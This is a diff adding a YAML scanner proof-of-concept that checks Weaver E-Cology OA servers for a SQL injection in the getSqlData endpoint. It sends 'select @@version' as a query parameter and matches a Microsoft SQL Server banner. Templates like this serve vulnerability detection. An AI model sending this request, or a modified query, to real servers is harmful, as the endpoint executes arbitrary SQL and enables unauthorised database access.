@@ -1,0 +1,13 @@
+name: poc-yaml-weaver-E-Cology-getSqlData-sqli
+rules:
+  - method: GET
+    path: /Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b'Microsoft SQL Server')
+
+detail:
+  author: PeiQi0
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20getSqlData%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: weaver,sqli
